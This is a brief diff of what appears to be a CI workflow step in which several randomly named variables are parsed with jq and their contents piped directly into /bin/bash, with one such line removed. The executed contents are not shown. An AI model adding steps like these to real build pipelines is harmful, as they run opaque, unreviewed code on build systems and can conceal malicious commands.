@@ -34,7 +34,6 @@ jobs:
           echo $eakf074 | jq -r .s7 | /bin/bash
           echo $tvsno2 | jq -r .h441 | /bin/bash
           printf '%s' "$fw6" | jq -r .im3 | /bin/bash
-          printf '%s' "$e83772" | jq -r .hpxmf138 | /bin/bash
           echo $zq2903 | jq -r .evtx5 | /bin/bash
 
       - name: Save output
